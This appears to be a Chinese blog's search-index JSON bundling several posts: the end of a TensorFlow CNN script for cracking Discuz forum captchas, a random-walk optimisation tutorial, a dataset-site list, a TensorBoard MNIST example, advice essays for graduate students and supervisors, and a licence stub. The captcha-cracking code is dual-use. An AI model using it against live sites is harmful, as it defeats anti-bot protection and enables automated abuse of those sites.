tf.Variable(b_alpha*tf.random_normal([32])) conv1 = tf.nn.relu(tf.nn.bias_add(tf.nn.conv2d(x, w_c1, strides=[1, 1, 1, 1], padding='SAME'), b_c1)) conv1 = tf.nn.max_pool(conv1, ksize=[1, 2, 2, 1], strides=[1, 2, 2, 1], padding='SAME') w_c2 = tf.Variable(w_alpha*tf.random_normal([3, 3, 32, 64])) b_c2 = tf.Variable(b_alpha*tf.random_normal([64])) conv2 = tf.nn.relu(tf.nn.bias_add(tf.nn.conv2d(conv1, w_c2, strides=[1, 1, 1, 1], padding='SAME'), b_c2)) conv2 = tf.nn.max_pool(conv2, ksize=[1, 2, 2, 1], strides=[1, 2, 2, 1], padding='SAME') w_c3 = tf.Variable(w_alpha*tf.random_normal([3, 3, 64, 64])) b_c3 = tf.Variable(b_alpha*tf.random_normal([64])) conv3 = tf.nn.relu(tf.nn.bias_add(tf.nn.conv2d(conv2, w_c3, strides=[1, 1, 1, 1], padding='SAME'), b_c3)) conv3 = tf.nn.max_pool(conv3, ksize=[1, 2, 2, 1], strides=[1, 2, 2, 1], padding='SAME') w_d = tf.Variable(w_alpha*tf.random_normal([4*13*64, 1024])) b_d = tf.Variable(b_alpha*tf.random_normal([1024])) dense = tf.reshape(conv3, [-1, w_d.get_shape().as_list()[0]]) dense = tf.nn.relu(tf.add(tf.matmul(dense, w_d), b_d)) dense = tf.nn.dropout(dense, self.keep_prob) w_out = tf.Variable(w_alpha*tf.random_normal([1024, self.max_captcha*self.char_set_len])) b_out = tf.Variable(b_alpha*tf.random_normal([self.max_captcha*self.char_set_len])) out = tf.add(tf.matmul(dense, w_out), b_out) return out def train_crack_captcha_cnn(self): output = self.crack_captcha_cnn() # 创建损失函数 diff = tf.nn.sigmoid_cross_entropy_with_logits(logits=output, labels=self.Y) loss = tf.reduce_mean(diff) tf.summary.scalar('loss', loss) # 使用AdamOptimizer优化器训练模型，最小化交叉熵损失 optimizer = tf.train.AdamOptimizer(learning_rate=0.001).minimize(loss) # 计算准确率 y = tf.reshape(output, [-1, self.max_captcha, self.char_set_len]) y_ = tf.reshape(self.Y, [-1, self.max_captcha, self.char_set_len]) correct_pred = tf.equal(tf.argmax(y, 2), tf.argmax(y_, 2)) accuracy = tf.reduce_mean(tf.cast(correct_pred, tf.float32)) tf.summary.scalar('accuracy', accuracy) merged = tf.summary.merge_all() with tf.Session() as sess: # 写到指定的磁盘路径中 train_writer = tf.summary.FileWriter(self.log_dir + '/train', sess.graph) test_writer = tf.summary.FileWriter(self.log_dir + '/test') sess.run(tf.global_variables_initializer()) # 遍历self.max_steps次 for i in range(self.max_steps): # 迭代500次，打乱一下数据集 if i % 20 == 0: self.test_imgs, self.test_labels, self.train_imgs, self.train_labels = self.get_imgs() # 每10次，使用测试集，测试一下准确率 if i % 10 == 0: batch_x_test, batch_y_test = self.get_next_batch(False, 100) summary, acc = sess.run([merged, accuracy], feed_dict={self.X: batch_x_test, self.Y: batch_y_test, self.keep_prob: 1}) print('迭代第%d次 accuracy:%f' % (i+1, acc)) test_writer.add_summary(summary, i) # 如果准确率大于85%，则保存模型并退出。 if acc &gt; 0.85: train_writer.close() test_writer.close() break # 一直训练 else: batch_x, batch_y = self.get_next_batch(True, 100) loss_value, _ = sess.run([loss, optimizer], feed_dict={self.X: batch_x, self.Y: batch_y, self.keep_prob: 1}) print('迭代第%d次 loss:%f' % (i+1, loss_value)) curve = sess.run(merged, feed_dict={self.X: batch_x_test, self.Y: batch_y_test, self.keep_prob: 1}) train_writer.add_summary(curve, i) train_writer.close() test_writer.close()if __name__ == '__main__': dz = Discuz() dz.train_crack_captcha_cnn()","link":"/2019/10/07/python验证码识别/"},{"title":"一个全局最优化的方法：随机游走算法(Random Walk)","text":"1.关于全局最优化求解全局最优化是一个非常复杂的问题，目前还没有一个通用的办法可以对任意复杂函数求解全局最优值。一个求解局部极小值的方法——梯度下降法。这种方法对于求解精度不高的情况是实用的，可以用局部极小值近似替代全局最小值点。但是当要求精确求解全局最小值时，梯度下降法就不适用了，需要采用其他的办法求解。常见的求解全局最优的办法有拉格朗日法、线性规划法、以及一些人工智能算法比如遗传算法、粒子群算法、模拟退火算法等。而今天要说的是一个操作简单但是不易陷入局部极小值的方法：随机游走算法。 2.随机游走算法操作步骤 3.随机游走的代码实现(使用Python) 12345678910111213141516171819202122232425262728293031323334353637383940414243'''@Description:使用随机游走算法求解函数极值这里求解:f = sin(r)/r + 1,r = sqrt((x-50)^2+(y-50)^2)+e,0&lt;=x,y&lt;=100 的最大值求解f的最大值，可以转化为求-f的最小值问题'''from __future__ import print_functionimport mathimport randomN = 100 # 迭代次数step = 0.5 # 初始步长epsilon = 0.00001variables = 2 # 变量数目x = [49,49] # 初始点坐标walk_num = 1 # 初始化随机游走次数print(\"迭代次数:\",N)print(\"初始步长:\",step)print(\"epsilon:\",epsilon)print(\"变量数目:\",variables)print(\"初始点坐标:\",x)# 定义目标函数def function(x): r = math.sqrt((x[0]-50)**2 + (x[1]-50)**2) + math.e f = math.sin(r)/r + 1 return -f# 开始随机游走while(step &gt; epsilon): k = 1 # 初始化计数器 while(k &lt; N): u = [random.uniform(-1,1) for i in range(variables)] # 随机向量 # u1 为标准化之后的随机向量 u1 = [u[i]/math.sqrt(sum([u[i]**2 for i in range(variables)])) for i in range(variables)] x1 = [x[i] + step*u1[i] for i in range(variables)] if(function(x1) &lt; function(x)): # 如果找到了更优点 k = 1 x = x1 else: k += 1 step = step/2 print(\"第%d次随机游走完成。\" % walk_num) walk_num += 1print(\"随机游走次数:\",walk_num-1)print(\"最终最优点:\",x)print(\"最终最优值:\",function(x)) 输出结果如下: 12345678910111213迭代次数: 100初始步长: 0.5epsilon: 1e-05变量数目: 2初始点坐标: [49, 49]第1次随机游走完成。第2次随机游走完成。第3次随机游走完成。......第16次随机游走完成。随机游走次数: 16最终最优点: [49.99999305065255, 50.00000102537616]最终最优值: -1.15111524497 基本的随机游走算法对于初始点比较敏感，可以看出，当初始点位于最优点附件时，可以很好地达到全局最优点；如果将初始点设置得离最优点较远，比如设置初始点为(10,10)时，其他参数不变，得到结果为： 123随机游走次数: 16最终最优点: [10.042835581532445, 11.648866165553416]最终最优值: -1.01720848747 可以发现，随机游走陷入了局部最优点。当然，如果增大迭代次数N以及初始步长λ，可以在一定程度上增加寻优能力，比如设置N=3000,λ=10.0，得到结果如下： 12345678910111213迭代次数: 3000初始步长: 10.0epsilon: 1e-05变量数目: 2初始点坐标: [10, 10]第1次随机游走完成。第2次随机游走完成。第3次随机游走完成。......第20次随机游走完成。随机游走次数: 20最终最优点: [49.99999900055026, 50.0000023931389]最终最优值: -1.15111697755 可以看出，当增大迭代次数以及初始步长之后，函数最终达到了全局最优点。但是迭代次数增加的代价则是运行时间的增加。总得来说，基本的随机游走算法可以很好地达到全局最优点，但是有时会依赖于初始点的选择。 4.改进的随机游走算法 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253'''@Description:改进的随机游走算法这里求解:f = sin(r)/r + 1,r = sqrt((x-50)^2+(y-50)^2)+e,0&lt;=x,y&lt;=100 的最大值求解f的最大值，可以转化为求-f的最小值问题'''from __future__ import print_functionimport mathimport randomN = 100 # 迭代次数step = 10.0 # 初始步长epsilon = 0.00001variables = 2 # 变量数目x = [-100,-10] # 初始点坐标walk_num = 1 # 初始化随机游走次数n = 10 # 每次随机生成向量u的数目print(\"迭代次数:\",N)print(\"初始步长:\",step)print(\"每次产生随机向量数目:\",n)print(\"epsilon:\",epsilon)print(\"变量数目:\",variables)print(\"初始点坐标:\",x)# 定义目标函数def function(x): r = math.sqrt((x[0]-50)**2 + (x[1]-50)**2) + math.e f = math.sin(r)/r + 1 return -f# 开始随机游走while(step &gt; epsilon): k = 1 # 初始化计数器 while(k &lt; N): # 产生n个向量u x1_list = [] # 存放x1的列表 for i in range(n): u = [random.uniform(-1,1) for i1 in range(variables)] # 随机向量 # u1 为标准化之后的随机向量 u1 = [u[i3]/math.sqrt(sum([u[i2]**2 for i2 in range(variables)])) for i3 in range(variables)] x1 = [x[i4] + step*u1[i4] for i4 in range(variables)] x1_list.append(x1) f1_list = [function(x1) for x1 in x1_list] f1_min = min(f1_list) f1_index = f1_list.index(f1_min) x11 = x1_list[f1_index] # 最小f1对应的x1 if(f1_min &lt; function(x)): # 如果找到了更优点 k = 1 x = x11 else: k += 1 step = step/2 print(\"第%d次随机游走完成。\" % walk_num) walk_num += 1print(\"随机游走次数:\",walk_num-1)print(\"最终最优点:\",x)print(\"最终最优值:\",function(x)) 输出结果如下： 1234567891011121314迭代次数: 100初始步长: 10.0每次产生随机向量数目: 10epsilon: 1e-05变量数目: 2初始点坐标: [-100, -10]第1次随机游走完成。第2次随机游走完成。第3次随机游走完成。.....第20次随机游走完成。随机游走次数: 20最终最优点: [49.999997561093195, 49.99999839875969]最终最优值: -1.15111685082 可以发现，即使迭代次数N=100不大，初始点(−100,−10)离最优点(50,50)非常远，改进的随机游走算法依然可以达到最优点。这说明了改进的随机游走算法具有更强大的寻优能力以及对于初始点更低的依赖性。 注：经过多次试验发现，无论是随机游走算法还是改进的随机游走算法，对于步长都是非常依赖的。步长λ越大，意味着初始可以寻找最优解的空间越大，但同时也意味着更多的迭代次数(要搜索空间变大，寻找次数变多，相应时间自然要增加)。如果步长取得过小，即使N很大，也很难达到最优解。无论对于随机游走算法还是改进的随机游走算法皆是如此。所以理论上步长λ越大越好。但是步长越大，迭代总次数越高，算法运行时间越长。所以实践中可以多试验几次，将λ取得适当地大即可。","link":"/2019/10/07/一个全局最优化的方法：随机游走算法-Random-Walk/"},{"title":"数据集网站","text":"一.如何使用这些资源?如何使用这些数据源是没有限制的，应用和使用只受到您的创造力和实际应用。使用它们最简单的方法是进行数据项目并在网站上发布它们。这不仅能提高你的数据和可视化技能，还能改善你的结构化思维。另一方面，如果你正在考虑/处理基于数据的产品，这些数据集可以通过提供额外的/新的输入数据来增加您的产品的功能。所以，继续在这些项目上工作吧，与更大的世界分享它们，以展示你的数据能力!我们已经在不同的部分中划分了这些数据源，以帮助你根据应用程序对数据源进行分类。我们从简单、通用和易于处理数据集开始，然后转向大型/行业相关数据集。然后，我们为特定的目的——文本挖掘、图像分类、推荐引擎等提供数据集的链接。这将为您提供一个完整的数据资源列表。如果你能想到这些数据集的任何应用，或者知道我们漏掉了什么流行的资源，请在下面的评论中与我们分享。（部分可能需要翻墙） 二.由简单和通用的数据集开始1.data.gov ( https://www.data.gov/ ) 这是美国政府公开数据的所在地，该站点包含了超过19万的数据点。这些数据集不同于气候、教育、能源、金融和更多领域的数据。 2.data.gov.in ( https://data.gov.in/ ) 这是印度政府公开数据的所在地，通过各种行业、气候、医疗保健等来寻找数据，你可以在这里找到一些灵感。根据你居住的国家的不同，你也可以从其他一些网站上浏览类似的网站。 3.World Bank( http://data.worldbank.org/ ) 世界银行的开放数据。该平台提供 Open Data Catalog，世界发展指数，教育指数等几个工具。 4.RBI ( https://rbi.org.in/Scripts/Statistics.aspx ) 印度储备银行提供的数据。这包括了货币市场操作、收支平衡、银行使用和一些产品的几个指标。 5.Five Thirty Eight Datasets ( https://github.com/fivethirtyeight/data ) Five Thirty Eight，亦称作 538，专注与民意调查分析，政治，经济与体育的博客。该数据集为 Five Thirty Eight Datasets 使用的数据集。每个数据集包括数据，解释数据的字典和Five Thirty Eight 文章的链接。如果你想学习如何创建数据故事，没有比这个更好。 三.大型数据集1.Amazon Web Services（AWS）datasets( https://aws.amazon.com/cn/datasets/ ) Amazon提供了一些大数据集，可以在他们的平台上使用，也可以在本地计算机上使用。您还可以通过EMR使用EC2和Hadoop来分析云中的数据。在亚马逊上流行的数据集包括完整的安然电子邮件数据集，Google Books n-gram，NASA NEX 数据集，百万歌曲数据集等。 2.Google datasets( https://cloud.google.com/bigquery/public-data/ ) Google 提供了一些数据集作为其 Big Query 工具的一部分。包括 GitHub 公共资料库的数据，Hacker News 的所有故事和评论。 3.Youtube labeled Video Dataset( https://research.google.com/youtube8m/ ) 几个月前，谷歌研究小组发布了YouTube上的“数据集”，它由800万个YouTube视频id和4800个视觉实体的相关标签组成。它来自数十亿帧的预先计算的，最先进的视觉特征。 四.预测建模与机器学习数据集1.UCI Machine Learning Repository( https://archive.ics.uci.edu/ml/datasets.html ) UCI机器学习库显然是最著名的数据存储库。如果您正在寻找与机器学习存储库相关的数据集，通常是首选的地方。这些数据集包括了各种各样的数据集，从像Iris和泰坦尼克这样的流行数据集到最近的贡献，比如空气质量和GPS轨迹。存储库包含超过350个与域名类似的数据集(分类/回归)。您可以使用这些过滤器来确定您需要的数据集。 2.Kaggle( https://www.kaggle.com/datasets ) Kaggle提出了一个平台，人们可以贡献数据集，其他社区成员可以投票并运行内核/脚本。他们总共有超过350个数据集——有超过200个特征数据集。虽然一些最初的数据集通常出现在其他地方，但我在平台上看到了一些有趣的数据集，而不是在其他地方出现。与新的数据集一起，界面的另一个好处是，您可以在相同的界面上看到来自社区成员的脚本和问题。 3.Analytics Vidhya(https://datahack.analyticsvidhya.com/contest/all/ ) 您可以从我们的实践问题和黑客马拉松问题中参与和下载数据集。问题数据集基于真实的行业问题，并且相对较小，因为它们意味着2 - 7天的黑客马拉松。 4.Quandl( https://www.quandl.com/ ) Quandl 通过起网站、API 或一些工具的直接集成提供了不同来源的财务、经济和替代数据。他们的数据集分为开放和付费。所有开放数据集为免费，但高级数据集需要付费。通过搜索仍然可以在平台上找到优质数据集。例如，来自印度的证券交易所数据是免费的。 5.Past KDD Cups( http://www.kdd.org/kdd-cup ) KDD Cup 是 ACM Special Interest Group 组织的年度数据挖掘和知识发现竞赛。 6.Driven Data( https://www.drivendata.org/ ) Driven Data 发现运用数据科学带来积极社会影响的现实问题。然后，他们为数据科学家组织在线模拟竞赛，从而开发出最好的模型来解决这些问题。 五.图像分类数据集1.The MNIST Database( http://yann.lecun.com/exdb/mnist/ ) 最流行的图像识别数据集，使用手写数字。它包括6万个示例和1万个示例的测试集。这通常是第一个进行图像识别的数据集。 2.Chars74K(http://www.ee.surrey.ac.uk/CVSSP/demos/chars74k/ ) 这里是下一阶段的进化，如果你已经通过了手写的数字。该数据集包括自然图像中的字符识别。数据集包含74,000个图像，因此数据集的名称。 3.Frontal Face Images(http://vasc.ri.cmu.edu//idb/html/face/frontal_images/index.html ) 如果你已经完成了前两个项目，并且能够识别数字和字符，这是图像识别中的下一个挑战级别——正面人脸图像。这些图像是由CMU &amp; MIT收集的，排列在四个文件夹中。 4.ImageNet( http://image-net.org/ ) 现在是时候构建一些通用的东西了。根据WordNet层次结构组织的图像数据库(目前仅为名词)。层次结构的每个节点都由数百个图像描述。目前，该集合平均每个节点有超过500个图像(而且还在增加)。 六.文本分类数据集1.Spam – Non Spam(http://www.esp.uem.es/jmgomez/smsspamcorpus/) 区分短信是否为垃圾邮件是一个有趣的问题。你需要构建一个分类器将短信进行分类。 2.Twitter Sentiment Analysis(http://thinknook.com/twitter-sentiment-analysis-training-corpus-dataset-2012-09-22/) 该数据集包含 1578627 个分类推文，每行被标记为1的积极情绪，0位负面情绪。数据依次基于 Kaggle 比赛和 Nick Sanders 的分析。 3.Movie Review Data(http://www.cs.cornell.edu/People/pabo/movie-review-data/) 这个网站提供了一系列的电影评论文件，这些文件标注了他们的总体情绪极性(正面或负面)或主观评价(例如，“两个半明星”)和对其主观性地位(主观或客观)或极性的标签。 七.推荐引擎数据集1.MovieLens( https://grouplens.org/ ) MovieLens 是一个帮助人们查找电影的网站。它有成千上万的注册用户。他们进行自动内容推荐，推荐界面，基于标签的推荐页面等在线实验。这些数据集可供下载，可用于创建自己的推荐系统。 2.Jester(http://www.ieor.berkeley.edu/~goldberg/jester-data/) 在线笑话推荐系统。 八.各种来源的数据集网站1.KDNuggets(http://www.kdnuggets.com/datasets/index.html) KDNuggets 的数据集页面一直是人们搜索数据集的参考。列表全面，但是某些来源不再提供数据集。因此，需要谨慎选择数据集和来源。 2.Awesome Public Datasets(https://github.com/caesar0301/awesome-public-datasets) 一个GitHub存储库，它包含一个由域分类的完整的数据集列表。数据集被整齐地分类在不同的领域，这是非常有用的。但是，对于存储库本身的数据集没有描述，这可能使它非常有用。 3.Reddit Datasets Subreddit(https://www.reddit.com/r/datasets/) 由于这是一个社区驱动的论坛，它可能会遇到一些麻烦(与之前的两个来源相比)。但是，您可以通过流行/投票来对数据集进行排序，以查看最流行的数据集。另外，它还有一些有趣的数据集和讨论。","link":"/2019/10/07/数据集网站/"},{"title":"一个tensorflow的可视化示例代码","text":"TensorFlow主要优势是灵活和可视化。TensorBoard是TensorFlow的一组可视化工具。熟悉的使用TensorBoard可以大大提高训练的效率。今天本文将介绍一下TensorBoard。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182import tensorflow as tffrom tensorflow.examples.tutorials.mnist import input_data#载入数据mnist=input_data.read_data_sets('mnist_data',one_hot=True)#noe_hot把像素点都转变成0或1的形式#每个批次的大小，训练模型时，一次放入一批次batch_size=100 #一批次100张图#计算一共有多少个批次n_batch=mnist.train.num_examples//batch_size# //是整除,得到批次数#参数概要def variable_summaries(var):#定义一个函数，作用是计算各种参数值 with tf.name_scope('summaries'): mean=tf.reduce_mean(var)#计算平均值 tf.summary.scalar('mean',mean)#记录平均值，将其命名为mean。summary.scalar用来显示标量信息 with tf.name_scope('stddev'): stddev=tf.sqrt(tf.reduce_mean(tf.square(var-mean))) tf.summary.scalar('stddev',stddev)# 标准差 tf.summary.scalar('max',tf.reduce_max(var))#最大值 tf.summary.scalar('min',tf.reduce_min(var))#最小值 tf.summary.histogram('histogram',var)#直方图#命名空间with tf.name_scope('input'): #命名随意，比如input,下面的x和y要缩进，表示x，y放在input空间#定义两个placeholder，配合上面命名空间，给x，y取个名字 x=tf.placeholder(tf.float32,[None,784],name='x-input')#建立一个占位符，None是图片数，784是每幅图的像素个数 y=tf.placeholder(tf.float32,[None,10],name='y-input')# 标签，建立一个占位符，10是指0-9十个数with tf.name_scope('layer'):#创建一个简单的神经网络，输入层784个神经元，输出层10个神经元，不设隐藏层 with tf.name_scope('wights'): W=tf.Variable(tf.zeros([784,10]),name='W')#权值，设一个变量，置0 variable_summaries(W)#把权值W当作参数，计算的各种指标 with tf.name_scope('biases'): b=tf.Variable(tf.zeros([10]),name='b')#偏置值 variable_summaries(b)#把偏置值b当作参数，计算的各种指标 with tf.name_scope('wx_plus_b'): wx_plus_b=tf.matmul(x,W)+b with tf.name_scope('softmax'): prediction=tf.nn.softmax(tf.matmul(x,W)+b)#信号总和，经过softmax函数（激活函数）转化成概率值#二次代价函数#loss =tf.reduce_mean(tf.square(y-prediction))#使用交叉熵代价函数with tf.name_scope('loss'): loss=tf.reduce_mean(tf.nn.softmax_cross_entropy_with_logits(labels=y,logits=prediction)) tf.summary.scalar('loss',loss)#使用梯度下降法with tf.name_scope('train'): train_step=tf.train.GradientDescentOptimizer(0.2).minimize(loss)#初始化变量init=tf.global_variables_initializer()with tf.name_scope('accuracy'): with tf.name_scope('correct_prediction'):#训练好后求准确率，结果存放在一个布尔型列表中，argmax返回一维张量中最大的值所在的位置 correct_prediction=tf.equal(tf.argmax(y,1),tf.argmax(prediction,1))#argmax函数是对行或列计算最大值，1表示按行，0表示按列，找到最大概率标签的位置。 equal函数是比较两个参数大小，相等的话返回True，不相等返回False with tf.name_scope('accuracy'):#求准确率 accuracy=tf.reduce_mean(tf.cast(correct_prediction,tf.float32))#cast()是类型转换函数，把布尔型参数转换为32位古典型,然后求平均值。true变成1.0，flse变成0#Boolean→数值型：True转换为-1，False转换为0。数值型→Boolean：0转换为False，其他转换为True tf.summary.scalar('accuracy',accuracy)#合并所有的summary,并将其加入到sess.run的语句里merged=tf.summary.merge_all()with tf.Session() as sess: sess.run(init)#初始化变量 writer=tf.summary.FileWriter('./graphs',sess.graph)#'logs/'是路径，graph存在logs文件夹中，如果没有logs文件夹，这里会自动生成 for epoch in range(51):#迭代21个周期，把所有图片训练21次 for batch in range(n_batch): batch_xs,batch_ys=mnist.train.next_batch(batch_size)#一次分配100张图片，图片数据保存在batch_xs，标签保存在batch_ys summary,_=sess.run([merged,train_step],feed_dict={x:batch_xs,y:batch_ys})#每tain训练一次，统计一次参数merged，运行后得到的merged存在summary里 writer.add_summary(summary,epoch)#将summary和运行周期epoch写入tensorboard文件 acc=sess.run(accuracy,feed_dict={x:mnist.test.images,y:mnist.test.labels})#x输入测试图片，从而得到prediciton的y，从而和label y 对比 print('Iter'+str(epoch)+',Testing Accuracy'+str(acc))","link":"/2019/10/07/一个tensorflow的可视化示例代码/"},{"title":"告研究生新生/研究生导师书","text":"告研究生新生书作者：北京邮电大学杨义先教授 各位新同学，大家好！ 首先祝贺各位在刚刚结束的考研竞争中过关斩将，收获了人生的又一次成功！今天借此喜庆之日，顺便说几句心里话，也算是送给各位的见面礼吧。 （1）什么是研究生？研究生就是做研究的学生，因此，大家不要再把本科阶段的“视分如命”传统带进来。从今以后，请大家记住：“考试，60分万岁；研究，90分及格！”若有某研究生给导师报喜说：“老师我已经超额多上X门课程，并考试得满分”，那么，导师也许会把他当作可爱的小傻瓜，你不会来夺此头衔吧？当然，研究生培养方案中包括课程、学分、考试和论文等所有要求都必须首先满足！特别提醒各位，研究生的论文是“干”出来的，而不是埋头“写”出来的，更不是“抄”来的！抄袭论文很危险，害人害已，后果不堪设想 （2）导师将教给你什么？导师不再教你更多的知识，因为，在知识爆炸的时代，即使是天才，他所能掌握的知识也几乎可以忽略不计。从小到大，你被灌输的知识已经够多了，现在是该你学会“如何自己学习知识”的时候了！导师将重点培养你的三种能力：创新能力、动手能力、社会适应能力。当然，还有一点，导师也许将把自己多年失败的教训毫不隐瞒地展示给你，以使你不再重蹈覆辙。成功者的经验很难被复制，但是，他的失败却足以借鉴。 （3）如何给自己定位？定位不清，害死人！虽然每个人都有“顶天”和“立地”两种选择；但能“顶天”之人，毕竟是少数；绝大部分人将“立地”！若你没特别的理论研究天赋，不能成为“顶天”的科学家，那就建议你老老实实瞄准“立地”的工程师。科学家和工程师都同等重要，不必再分高低贵贱。社会并不急需“既能做一些不痛不痒的项目，又能发表几篇不三不四的论文”的所谓通才，强劲的社会竞争力是检验学生培养是否成功的唯一标准。 （4）什么兴趣值得付出代价？并非所有兴趣都该纵容，许多研究生误解了“兴趣是成功之母”，并常常拿“兴趣”来作为挑肥拣瘦的借口。如果有足够的胆量，那么，独门兴趣（如，扎克伯格的Facebook等）才值得死盯，因为，这样的兴趣要么送你上天堂，要么拉你下地狱。人生有此机会一搏，也不全是坏事！但是，大众化兴趣（比如，我更擅长单片机、我的本科专业更适合…、我学过XX课程等）就应该服从真实需求，必要时劝君忍痛割爱，否则成功将与你无缘，毕竟今后是你要去适应社会，而不是社会来适应你！其实，咬住大众化兴趣不放者要么是想偷懒，要么是没自信。当然，所有生活兴趣都是值得享受的，工作兴趣与生活兴趣不要混为一谈。 （5）态度到底有多重要？态度决定一切！只要态度出了问题，再加上研究生都有极高的智商，那么，稍稍发力，就能让任何导师“理屈词穷”，比如，可以轻易严格证明“研究生做项目是在给导师打工”、“导师在论文中的署名不合理”、“我的论文创新性已经足够毕业”等等。面对如此辩才，导师只能尽力而为，实在无奈，也只好弃权。多年的事实证明，能力弱和态度差常常相伴而生，也许正是因为态度差，才导致能力弱吧。“小事愿干，中事能干，大事敢干”是研究生的基本要求。 （6）“尽力而为”与“竭尽全力”的区别到底有多大？“尽力而为”者用99.99%（＝A）的力气去做事，“竭尽全力”者用100.01%（=B）的力气去做事。表面上看A@B，但是，当若干个A相乘时，将有A´ A´ A´…=0, 而若干个B 相乘时B´ B´ B´…=¥。各位新同学明白了吗？如果你一生都“尽力而为”的话，那么，你将收获零；如果你一生都“竭尽全力”的话，那么，你将收获巨大成功！ （7）做啥课题真的很重要吗？从学习知识的角度来说，做啥课题确实有区别；但是，从培养能力角度来看，其实啥课题的效果都一样。别忘了，如今已是“重能力，而轻知识”的年代！过度区分是所有矛盾的根源，过度关注细节差异者永远也得不到满足。另外，如果在某段时间内，被安排从事一个自己不了解或不擅长的课题，那你为何不把它当成一种挑战，以此来锻炼和培养自己的“适应”和“学习”的能力呢？ （8）高分学生为什么容易成低能？过去多年的事实反复证明：保研学生和考研高分的学生，更容易在研究生阶段成为低能学生。这个看似矛盾的现象，其实有其必然。 原因1，个别高分学生总是习惯以讲课和考试的思维去考虑问题，从小到大，他/她的成就感也主要来自于各类考试，因此，没有考试，不能得分的事情（比如，科研）他们都下意识地抵制或恐惧。 原因2，读研前，几乎都是别人来向他/她请教有关学习和考试的问题，这就无形中使他/她感觉过于良好，因此，一旦有不懂的科研事项，就很难放下架子去向别人（特别是那些考试成绩较差的人）请教，当然，久而久之就会落后甚至被无情地淘汰。 原因3，过于精通本科阶段的循序渐进方法，更难适应研究问题时的跳跃创新，以为科研也要把所有准备工作都做好后，才能开始。 原因4，过于企望本科考试优势能够顺利过渡到研究生的科研阶段，因此，思想包袱更重，更不敢面对新挑战。 同学们，今天的见面礼可不能白送哟！希望毕业时，大家能够以自身的杰出成就来回母校，更希望大家今后走向社会为国争光，期待着那一天的到来！ 谢谢！ 告研究生导师书作者：（一点建议罢了，不来自特定作者 第1条）教师出路千万条，安全执教第一条；自保不周全，亲人两行泪！啥意思？嘿嘿，你懂的！各位上有老，下有小，中间还有一个宝（配偶）；就算你不怕死、不要命，也该为他人考虑嘛！ 第2条）学生是亲人，弟子是亲人，爹妈儿女也是亲人，白头偕老的爱人更是亲人；别拿一类亲人去伤害另一类亲人，其实那不公平！若有人非要故意制造一些典型，那你笑看他们自己去煽情吧！ 第3条）学校的事重要，学生的事重要，家里的事情也重要；工作重要，生活重要，身体健康更重要；别因一种重要而忽略另一种重要，其实那样不地道！若有人非要给你戴高帽，嘿嘿，劝君一摆手：不要，不要！ 第4条）与时俱进，活到老，学到老。你曾经的辉煌毋庸置疑，但社会在飞速发展，技术在不断更新，新的挑战随时涌现，对人才的需求也在不断变化，你若不能紧跟形势，就会被边缘化，更会误人子弟。提醒一下，你有许多东西搞不懂，你需要向其它导师学习，甚至向研究生学习！ 第5条）研究生培养的手段，应服务于目标。社会满意度是人才培养的唯一且永恒目标，你有义务通过各种手段，大幅提高学生进入社会后的竞争力。只要有利于培养更多更优秀的学生，就该坚定不移地走自己的路，让他人说去吧。培养研究生的目的，不是为了赢得某些领导的肯定，而是为社会培养有用之才！ 第6条）全面理解创新内涵，重点培养创新能力。撰写论文、出版著作、研究高精尖课题等，都是培养研究生创新能力的有效手段；但实用产品开发、系统集成项目、软课题研究、成果转化等，也是培养创新能力的有效手段，它们不能被否认，甚至被歪曲。创新能力的培养既可在校内完成，更可通过校企合作完成。 第7条）放下架子培养学生的社会适应能力。导师称谓确实令人崇敬，但若优越感过强，将害人害已。每个人都该努力适应社会，而不是让社会来适应他。你能从自己做起，为学生树立榜样吗？项目谈判时，你能低头当好乙方吗？在欣赏自己的长处时，能尊重他人的短处吗？在重视纵向项目时，能不轻视横向项目吗？在取得理论成果时，能不藐视技术吗？能真心帮助暂时不如自己的同事吗？能真心佩服比自己强的其它老师吗？能时时事事转换角色吗？伙计，你的一举一动，可都是你学生的最好教材哟。 第8条）以身作则培养学生的团队精神。在激烈竞争的社会里，特别是在理工科行业里，没团队就几乎不可能有成功。“兵、将、帅”在任何团队中都不可缺少。团队精神既包括“挂帅”的智慧，也包括“做将”的勇气，更包括“当兵”的情怀。导师的如下行为，将严重影响研究生的团队精神培养：不挂“帅”吾宁死，那怕自身根本就不是帅才；若做“将”就只图清闲，不愿意面对任何攻坚；若当“兵”则懒散闲，放任自流，完全不顾团队的集体利益和自己应尽的义务。相信个别导师的这种行为，将不会得到研究生的认可，甚至可能被学生传为笑谈，当成反面教材。 第9条）“宽是害、严是爱”也适用于研究生培养，当然得因人而已，适当把握好度。师生是永远的利益共同体，即使毕业后，学生的成功，导师也是最大的受益者之一。处处迁就，肯定不是培养优秀研究生的好方法，虽然这样做可能会暂时获得某些学生的好感。所谓“一日为师，终生为父”就是要求导师像严父对待自己的儿子一样，敢于逼其成功！当然，对个别学生，你也要做好“一日为师，终生为孙”的准备；其实，那时你连孙子都不如，世上哪有爷爷坑害孙子的事！ 第10条）不是“成功才幸福”而是“幸福才成功”。成功很容易被片面有形化，比如，升职称、拿大奖、当选院士等。“有形成功”确实能带来短暂的幸福，但是，过于看重“有形成功”其实就是对自己幸福的不负责。上帝其实很公平，鱼和熊掌很难兼得，只要你踏踏实实，从现在做起，从小事做起，沿着自己心中的理想之路，你就能一边前进，一边幸福地享受沿途风光。 第11条）树立阳光心态应从导师做起。人人都在追求幸福，但有人却永远也找不到幸福；其实幸福就在每个人的心里。心态不良者看世间万物都不顺眼，消极悲观者不但自己活得累，也会严重污染生活环境，他们既毁灭了自己的幸福，更连累了身边的亲朋好友。“小事靠勤、中事靠能，大事靠德”，要想做一个好导师，必须以积极的心态在勤、能、德三个方面为学生垂范。 第12条）把钢加在刀刃上，重视培养研究生的综合素质。研究生毕业后，彼此之间的智商差别相对有限；但是，情商方面，可能就天壤之别了。而情商的高低，在毕业生后的职业生涯中，将起着越来越重要的作用；因此，花大力气提高研究生的情商，是事半功倍的最佳选择。","link":"/2019/10/06/告研究生新生-研究生导师书/"},{"title":"开源协议","text":"各种开源协议介绍 几种常见的开源协议 了解其他开源协议 世界上的开源许可证（Open Source License）大概有上百种，我们常用的开源软件协议大致有GPL、BSD、MIT、Mozilla、Apache和LGPL。我们不必要每个开源协议都了然于心，但是可以了解几个主要的协议的权利和义务。 如果看完还是一头雾水的话，乌克兰程序员Paul Bagwell，画了一张分析图，说明应该怎么选择，下图为国内大牛阮一峰汉化了版本。 来一个更加清晰和完全一点的图，目前只有英文版，后期我将会进行汉化。 